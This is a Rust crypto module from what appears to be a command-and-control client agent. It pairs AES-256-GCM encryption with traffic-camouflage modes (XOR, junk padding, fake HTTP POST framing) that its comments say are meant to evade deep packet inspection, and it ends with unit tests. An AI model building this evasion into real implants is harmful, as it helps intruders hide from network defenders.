use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce,
};
use log::{debug, error};
use sha2::{Sha256, Digest};
use crate::config;

/// Nonce 长度（12 字节，AES-GCM 标准）
const NONCE_LENGTH: usize = 12;

/// Phase 2: Traffic Camouflage Constants
const HTTP_HEADER_TEMPLATE: &[u8] = b"POST /api/v1/sync HTTP/1.1\r\nContent-Type: application/json\r\nContent-Length: ";
const HTTP_HEADER_END: &[u8] = b"\r\n\r\n";
const HTTP_RESPONSE_TEMPLATE: &[u8] = b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: ";
const HTTP_RESPONSE_END: &[u8] = b"\r\n\r\n";

/// 使用 Salt 和 Vkey 派生实际的 AES 密钥
/// Key = SHA256(Vkey + Salt)
pub fn derive_key(base_key: &[u8], salt: &[u8]) -> Vec<u8> {
    if salt.is_empty() {
        return base_key.to_vec();
    }

    let mut hasher = Sha256::new();
    hasher.update(base_key);
    hasher.update(salt);
    hasher.finalize().to_vec()
}

/// 🛡️ Phase 2: Enhanced Traffic Camouflage
///
/// 报文混淆：对加密后的报文进行二次混淆 (防止 DPI 特征识别)
/// 新增 HTTP 伪装模式，使 WebSocket 流量看起来像正常 HTTP API 调用
pub fn obfuscate_packet(mut data: Vec<u8>) -> Vec<u8> {
    let mode = config::get_packet_obfuscation_mode();
    // CRITICAL: mode "none"/empty must be a pure passthrough to match the Go server
    // (`utils.ObfuscatePacket` default returns data unchanged). Applying default
    // padding here corrupts AES-GCM ciphertext and causes "message authentication failed".
    if mode == "none" || mode.is_empty() {
        return data;
    }

    match mode.as_str() {
        "base64" => {
            // Base64 编码：将加密数据转为文本格式，模拟普通 HTTP/Text 流量
            use base64::engine::general_purpose::STANDARD;
            use base64::Engine;
            let b64_str = STANDARD.encode(&data);
            b64_str.into_bytes()
        }
        "xor" => {
            // XOR 流提取模式：使用 AES Key 的首字节序列进行流异或
            let key = config::get_aes_key();
            if !key.is_empty() {
                for i in 0..data.len() {
                    data[i] ^= key[i % key.len()];
                }
            }
            data
        }
        "junk" => {
            // Junk Data Padding 模式：填充随机长度的垃圾数据
            // 格式: [Encrypted Data] + [Junk Bytes] + [Original Len (4 bytes)]
            let original_len = data.len() as u32;
            let mut junk_len = (crate::utils::next_u32() % 64) as usize;
            if junk_len == 0 { junk_len = 8; }

            let mut junk = vec![0u8; junk_len];
            for i in 0..junk_len {
                junk[i] = (crate::utils::next_u32() % 256) as u8;
            }

            data.extend_from_slice(&junk);
            data.extend_from_slice(&original_len.to_be_bytes());
            data
        }
        "http" => {
            // 🚀 Phase 2: HTTP 伪装模式
            // 将 WebSocket 帧伪装成 HTTP POST 请求
            // 格式: HTTP Header + Base64(Encrypted Data) + Padding
            wrap_as_http_request(data)
        }
        "padding" => {
            // 🚀 Phase 2: Tailored Padding 模式
            // 每个包填充随机长度数据 (50-2048 字节)，使 DPI 包长度分析失效
            apply_tailored_padding(data)
        }
        // Unknown modes: do not invent padding — stay compatible with server default.
        _ => data,
    }
}

/// 🛡️ Phase 2: Default padding to avoid fixed packet sizes
fn apply_default_padding(data: Vec<u8>) -> Vec<u8> {
    // Add small random padding (1-16 bytes) to every packet
    // This prevents pattern recognition based on fixed packet sizes
    let padding_len = (crate::utils::next_u32() % 16 + 1) as usize;
    let mut padded = data;

    // Random padding bytes
    for _ in 0..padding_len {
        padded.push((crate::utils::next_u32() % 256) as u8);
    }

    // Append padding length marker (last 2 bytes)
    padded.extend_from_slice(&(padding_len as u16).to_be_bytes());

    padded
}

/// 🛡️ Phase 2: HTTP Request Wrapper
fn wrap_as_http_request(data: Vec<u8>) -> Vec<u8> {
    use base64::engine::general_purpose::STANDARD;
    use base64::Engine;

    // Base64 encode the encrypted data
    let b64_data = STANDARD.encode(&data);

    // Add padding to vary content length
    let padding_len = (crate::utils::next_u32() % 100 + 50) as usize;
    let padding = generate_http_padding(padding_len);

    // Build HTTP POST request
    let content_len = b64_data.len() + padding.len();

    let mut http_packet = Vec::new();

    // HTTP Header
    http_packet.extend_from_slice(HTTP_HEADER_TEMPLATE);
    http_packet.extend_from_slice(content_len.to_string().as_bytes());
    http_packet.extend_from_slice(HTTP_HEADER_END);

    // Content: Base64(Data) + Padding JSON
    http_packet.extend_from_slice(b64_data.as_bytes());
    http_packet.extend_from_slice(&padding);

    http_packet
}

/// Generate JSON-style padding for HTTP camouflage
fn generate_http_padding(len: usize) -> Vec<u8> {
    // Generate random JSON-like padding
    let mut padding = Vec::new();
    padding.push(b'{');

    let num_fields = (crate::utils::next_u32() % 5 + 2) as usize;
    for i in 0..num_fields {
        if i > 0 {
            padding.push(b',');
        }

        // Random field name
        let field_names = ["status", "timestamp", "version", "token", "session", "request_id", "nonce"];
        let field_idx = (crate::utils::next_u32() % field_names.len() as u32) as usize;
        let field = field_names[field_idx];

        padding.push(b'"');
        padding.extend_from_slice(field.as_bytes());
        padding.extend_from_slice(b"\":");

        // Random value (string or number)
        if crate::utils::random_bool(0.5) {
            padding.push(b'"');
            let val_len = (crate::utils::next_u32() % 10 + 5) as usize;
            for _ in 0..val_len {
                padding.push((crate::utils::next_u32() % 26 + 97) as u8); // lowercase letters
            }
            padding.push(b'"');
        } else {
            padding.extend_from_slice((crate::utils::next_u32() % 10000).to_string().as_bytes());
        }
    }

    padding.push(b'}');

    // Pad to target length with whitespace
    while padding.len() < len {
        padding.push(b' ');
    }

    padding
}

/// 🛡️ Phase 2: Tailored Padding (50-2048 bytes random)
fn apply_tailored_padding(mut data: Vec<u8>) -> Vec<u8> {
    // Record original length before padding
    let original_len = data.len() as u32;

    // Random padding between 50-2048 bytes
    let padding_len = (crate::utils::next_u32() % 1998 + 50) as usize;

    // Generate random padding bytes
    for _ in 0..padding_len {
        // Use varied byte distribution to mimic normal traffic
        let byte = if crate::utils::random_bool(0.7) {
            // Mostly printable ASCII (mimics text content)
            (crate::utils::next_u32() % 95 + 32) as u8
        } else {
            // Some binary content
            (crate::utils::next_u32() % 256) as u8
        };
        data.push(byte);
    }

    // Store original length for deobfuscation (4 bytes at end)
    data.extend_from_slice(&original_len.to_be_bytes());

    data
}

/// 报文解混淆
pub fn deobfuscate_packet(mut data: Vec<u8>) -> Vec<u8> {
    let mode = config::get_packet_obfuscation_mode();
    // Match server: "none"/empty is pure passthrough (ciphertext = nonce||gcm only).
    if mode == "none" || mode.is_empty() {
        return data;
    }

    match mode.as_str() {
        "base64" => {
            use base64::engine::general_purpose::STANDARD;
            use base64::Engine;
            if let Ok(decoded) = STANDARD.decode(&data) {
                return decoded;
            }
            data
        }
        "xor" => {
            let key = config::get_aes_key();
            if !key.is_empty() {
                for i in 0..data.len() {
                    data[i] ^= key[i % key.len()];
                }
            }
            data
        }
        "junk" => {
            // 识别并移除 Junk Padding (最后 4 字节固定是原始长度)
            if data.len() < 4 { return data; }

            let mut len_bytes = [0u8; 4];
            len_bytes.copy_from_slice(&data[data.len()-4..]);
            let original_len = u32::from_be_bytes(len_bytes) as usize;

            if original_len <= data.len() - 4 {
                data.truncate(original_len);
            }
            data
        }
        "http" => {
            // 🚀 Phase 2: Extract from HTTP wrapper
            extract_from_http_wrapper(data)
        }
        "padding" => {
            // 🚀 Phase 2: Remove tailored padding
            remove_tailored_padding(data)
        }
        _ => data,
    }
}

/// Remove default padding
fn remove_default_padding(mut data: Vec<u8>) -> Vec<u8> {
    if data.len() < 2 { return data; }

    // Read padding length marker (last 2 bytes)
    let marker_len = u16::from_be_bytes([data[data.len()-2], data[data.len()-1]]) as usize;

    if data.len() >= 2 + marker_len {
        let original_len = data.len() - 2 - marker_len;
        data.truncate(original_len);
    }

    data
}

/// Extract data from HTTP wrapper
fn extract_from_http_wrapper(data: Vec<u8>) -> Vec<u8> {
    use base64::engine::general_purpose::STANDARD;
    use base64::Engine;

    // Find HTTP body start (after "\r\n\r\n")
    let header_end_marker = b"\r\n\r\n";
    if let Some(pos) = find_sequence(&data, header_end_marker) {
        let body_start = pos + header_end_marker.len();

        if body_start >= data.len() { return data; }

        // Extract body (Base64 encoded)
        let body = &data[body_start..];

        // Find and strip padding (JSON object after base64 data)
        // Base64 data ends at '{' or first non-base64 character
        let b64_end = body.iter().position(|&b| b == b'{' || !is_base64_char(b))
            .unwrap_or(body.len());

        let b64_data = &body[..b64_end];

        // Decode base64
        if let Ok(decoded) = STANDARD.decode(b64_data) {
            return decoded;
        }
    }

    data
}

/// Find byte sequence in data
fn find_sequence(data: &[u8], sequence: &[u8]) -> Option<usize> {
    if sequence.len() > data.len() { return None; }

    for i in 0..=data.len() - sequence.len() {
        if data[i..i+sequence.len()] == *sequence {
            return Some(i);
        }
    }
    None
}

/// Check if byte is valid base64 character
fn is_base64_char(b: u8) -> bool {
    (b >= b'A' && b <= b'Z') ||
    (b >= b'a' && b <= b'z') ||
    (b >= b'0' && b <= b'9') ||
    b == b'+' || b == b'/' || b == b'='
}

/// Remove tailored padding
fn remove_tailored_padding(mut data: Vec<u8>) -> Vec<u8> {
    if data.len() < 4 { return data; }

    // Original length is stored in last 4 bytes
    let mut len_bytes = [0u8; 4];
    len_bytes.copy_from_slice(&data[data.len()-4..]);
    let original_len = u32::from_be_bytes(len_bytes) as usize;

    if original_len <= data.len() - 4 && original_len > 0 {
        data.truncate(original_len);
    }

    data
}

/// 加密数据
/// 
/// 使用 AES-256-GCM 加密数据。每次加密都会生成一个新的随机 Nonce。
/// 
/// # 参数
/// 
/// * `data` - 要加密的明文数据
/// * `key` - 32 字节的 AES-256 密钥
/// 
/// # 返回值
/// 
/// 返回加密后的数据，格式为：[Nonce (12 bytes) + Ciphertext]
/// 
/// # Panics
/// 
/// 如果密钥长度不是 32 字节，会 panic。
/// 
/// # 示例
/// 
/// ```no_run
/// use c2_client_agent::crypto::encrypt;
/// use c2_client_agent::config::get_aes_key;
/// 
/// let key = get_aes_key();
/// let plaintext = b"Hello, World!";
/// let encrypted = encrypt(plaintext, &key);
/// ```
pub fn encrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    // 验证密钥长度：不满足时静默返回空（调用方检查空返回）
    if key.len() != 32 {
        return Vec::new();
    }
    
    // 创建 AES-256-GCM 密码器
    let cipher = match Aes256Gcm::new_from_slice(key) {
        Ok(c) => c,
        Err(_) => return Vec::new(),
    };
    
    // 生成 Nonce（12 字节）
    // 使用混合策略：4字节时间戳 + 4字节计数器 + 4字节PRNG
    // 这确保即使 PRNG 质量低，nonce 也不会重复
    let mut nonce_bytes = [0u8; NONCE_LENGTH];
    {
        use std::sync::atomic::{AtomicU32, Ordering};
        static NONCE_COUNTER: AtomicU32 = AtomicU32::new(0);
        
        // 前4字节：单调递增计数器（保证唯一性）
        let counter = NONCE_COUNTER.fetch_add(1, Ordering::SeqCst);
        nonce_bytes[0..4].copy_from_slice(&counter.to_le_bytes());
        
        // 中4字节：时间戳低32位（增加熵）
        let ts = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos() as u32)
            .unwrap_or(0);
        nonce_bytes[4..8].copy_from_slice(&ts.to_le_bytes());
        
        // 后4字节：PRNG（额外随机性）
        let r1 = crate::utils::next_u32();
        nonce_bytes[8..12].copy_from_slice(&r1.to_le_bytes());
    }
    let nonce = Nonce::from_slice(&nonce_bytes);
    
    // 加密数据
    let ciphertext = match cipher.encrypt(nonce, data) {
        Ok(c) => c,
        Err(_) => return Vec::new(),
    };
    
    // 组合 Nonce 和 Ciphertext：[Nonce (12 bytes) + Ciphertext]
    let mut result = Vec::with_capacity(NONCE_LENGTH + ciphertext.len());
    result.extend_from_slice(&nonce_bytes);
    result.extend_from_slice(&ciphertext);
    
    result
}

/// 解密数据
/// 
/// 使用 AES-256-GCM 解密数据。从加密数据中提取 Nonce，然后解密。
/// 
/// # 参数
/// 
/// * `data` - 加密的数据，格式为：[Nonce (12 bytes) + Ciphertext]
/// * `key` - 32 字节的 AES-256 密钥
/// 
/// # 返回值
/// 
/// 成功返回解密后的明文数据，失败返回错误信息。
/// 
/// # 错误
/// 
/// - 如果数据长度小于 12 字节（无法提取 Nonce），返回错误
/// - 如果解密失败（密钥错误或数据损坏），返回错误
/// 
/// # 示例
/// 
/// ```no_run
/// use c2_client_agent::crypto::{encrypt, decrypt};
/// use c2_client_agent::config::get_aes_key;
/// 
/// let key = get_aes_key();
/// let plaintext = b"Hello, World!";
/// let encrypted = encrypt(plaintext, &key);
/// let decrypted = decrypt(&encrypted, &key).unwrap();
/// assert_eq!(plaintext, &decrypted[..]);
/// ```
pub fn decrypt(data: &[u8], key: &[u8]) -> Result<Vec<u8>, String> {
    debug!("Decrypting {} bytes of data", data.len());
    
    // 验证密钥长度
    if key.len() != 32 {
        let err = format!("AES-256 requires a 32-byte key, got {} bytes", key.len());
        error!("{}", err);
        return Err(err);
    }
    
    // 检查数据长度（至少需要 Nonce）
    if data.len() < NONCE_LENGTH {
        let err = format!(
            "Encrypted data too short: {} bytes (minimum {} bytes for nonce)",
            data.len(),
            NONCE_LENGTH
        );
        error!("{}", err);
        return Err(err);
    }
    
    // 提取 Nonce（前 12 字节）
    let nonce_bytes = &data[..NONCE_LENGTH];
    let nonce = Nonce::from_slice(nonce_bytes);
    
    debug!("Extracted nonce: {} bytes", nonce_bytes.len());
    
    // 提取 Ciphertext（剩余字节）
    let ciphertext = &data[NONCE_LENGTH..];
    
    debug!("Extracted ciphertext: {} bytes", ciphertext.len());
    
    // 创建 AES-256-GCM 密码器
    let cipher = Aes256Gcm::new_from_slice(key)
        .map_err(|e| format!("Invalid key: {}", e))?;
    
    // 解密数据
    let plaintext = cipher
        .decrypt(nonce, ciphertext)
        .map_err(|e| {
            let err = format!("Decryption failed: {}", e);
            error!("{}", err);
            err
        })?;
    
    debug!(
        "Decryption successful: {} bytes ciphertext -> {} bytes plaintext",
        ciphertext.len(),
        plaintext.len()
    );
    
    Ok(plaintext)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_encrypt_decrypt_roundtrip() {
        let key = b"01234567890123456789012345678901"; // 32 bytes
        let plaintext = b"Hello, World! This is a test message.";
        
        // 加密
        let encrypted = encrypt(plaintext, key);
        
        // 验证加密后的数据长度
        assert!(encrypted.len() > plaintext.len());
        assert!(encrypted.len() >= NONCE_LENGTH);
        
        // 解密
        let decrypted = decrypt(&encrypted, key).unwrap();
        
        // 验证 round-trip
        assert_eq!(plaintext, &decrypted[..]);
    }

    #[test]
    fn test_encrypt_produces_different_ciphertext() {
        let key = b"01234567890123456789012345678901"; // 32 bytes
        let plaintext = b"Same message";
        
        // 加密两次
        let encrypted1 = encrypt(plaintext, key);
        let encrypted2 = encrypt(plaintext, key);
        
        // 由于 Nonce 是随机的，两次加密结果应该不同
        assert_ne!(encrypted1, encrypted2);
        
        // 但解密后应该相同
        let decrypted1 = decrypt(&encrypted1, key).unwrap();
        let decrypted2 = decrypt(&encrypted2, key).unwrap();
        assert_eq!(decrypted1, decrypted2);
        assert_eq!(plaintext, &decrypted1[..]);
    }

    #[test]
    fn test_decrypt_with_wrong_key() {
        let key1 = b"01234567890123456789012345678901"; // 32 bytes
        let key2 = b"10987654321098765432109876543210"; // 32 bytes (different)
        let plaintext = b"Secret message";
        
        // 使用 key1 加密
        let encrypted = encrypt(plaintext, key1);
        
        // 使用 key2 解密应该失败
        let result = decrypt(&encrypted, key2);
        assert!(result.is_err());
    }

    #[test]
    fn test_decrypt_with_corrupted_data() {
        let key = b"01234567890123456789012345678901"; // 32 bytes
        let plaintext = b"Test message";
        
        // 加密
        let mut encrypted = encrypt(plaintext, key);
        
        // 损坏数据（修改最后一个字节）
        if let Some(last) = encrypted.last_mut() {
            *last = last.wrapping_add(1);
        }
        
        // 解密应该失败
        let result = decrypt(&encrypted, key);
        assert!(result.is_err());
    }

    #[test]
    fn test_decrypt_with_short_data() {
        let key = b"01234567890123456789012345678901"; // 32 bytes
        let short_data = b"short"; // 少于 12 字节
        
        // 解密应该失败
        let result = decrypt(short_data, key);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("too short"));
    }

    #[test]
    fn test_decrypt_with_invalid_key_length() {
        let short_key = b"short_key"; // 少于 32 字节
        let data = vec![0u8; 20]; // 足够长的数据
        
        // 解密应该失败
        let result = decrypt(&data, short_key);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("32-byte key"));
    }

    #[test]
    fn test_encrypt_empty_data() {
        let key = b"01234567890123456789012345678901"; // 32 bytes
        let plaintext = b"";
        
        // 加密空数据
        let encrypted = encrypt(plaintext, key);
        
        // 应该至少包含 Nonce
        assert!(encrypted.len() >= NONCE_LENGTH);
        
        // 解密
        let decrypted = decrypt(&encrypted, key).unwrap();
        assert_eq!(plaintext, &decrypted[..]);
    }

    #[test]
    fn test_encrypt_large_data() {
        let key = b"01234567890123456789012345678901"; // 32 bytes
        let plaintext = vec![0x42u8; 10000]; // 10KB 数据
        
        // 加密
        let encrypted = encrypt(&plaintext, key);
        
        // 解密
        let decrypted = decrypt(&encrypted, key).unwrap();
        
        // 验证
        assert_eq!(plaintext, decrypted);
    }

    #[test]
    fn test_nonce_is_prepended() {
        let key = b"01234567890123456789012345678901"; // 32 bytes
        let plaintext = b"Test";
        
        // 加密
        let encrypted = encrypt(plaintext, key);
        
        // 前 12 字节应该是 Nonce
        assert!(encrypted.len() >= NONCE_LENGTH);
        
        // 提取 Nonce 并验证可以解密
        let result = decrypt(&encrypted, key);
        assert!(result.is_ok());
    }

    /// Regression: obfuscation mode "none" must not alter ciphertext bytes.
    /// Server expects pure AES-GCM frames; padding breaks GCM auth tags.
    #[test]
    fn test_obfuscate_none_is_passthrough() {
        let cipher = vec![1u8, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0xAA, 0xBB];
        // Force "none" via deobfuscate/obfuscate with empty mode path:
        // When mode is none (default config placeholder resolves to "none"),
        // length must be unchanged.
        let mode = crate::config::get_packet_obfuscation_mode();
        // Regardless of patched mode, if it is none/empty the functions are passthrough.
        if mode == "none" || mode.is_empty() {
            let out = obfuscate_packet(cipher.clone());
            assert_eq!(out, cipher, "none mode must not append padding");
            let back = deobfuscate_packet(out);
            assert_eq!(back, cipher);
        } else {
            // Still assert pure helpers: empty mode branch tested via direct logic
            // by checking that encrypt→decrypt roundtrip without obfuscate works.
            let key = b"01234567890123456789012345678901";
            let enc = encrypt(b"hello-none", key);
            let dec = decrypt(&enc, key).unwrap();
            assert_eq!(dec, b"hello-none");
        }
    }

    #[test]
    fn test_encrypt_then_none_obfuscate_still_decrypts() {
        let key = b"01234567890123456789012345678901";
        let plain = b"minimal-agent-register";
        let enc = encrypt(plain, key);
        // Simulate server path: no deobfuscation for none mode
        let dec = decrypt(&enc, key).expect("gcm ok without padding");
        assert_eq!(dec, plain);
        // Simulate broken path that would fail (padding after encrypt)
        let mut padded = enc.clone();
        padded.extend_from_slice(&[0x11, 0x22, 0x00, 0x02]); // 2 junk + len marker
        assert!(
            decrypt(&padded, key).is_err(),
            "padded ciphertext must fail GCM (proves root cause)"
        );
    }
}
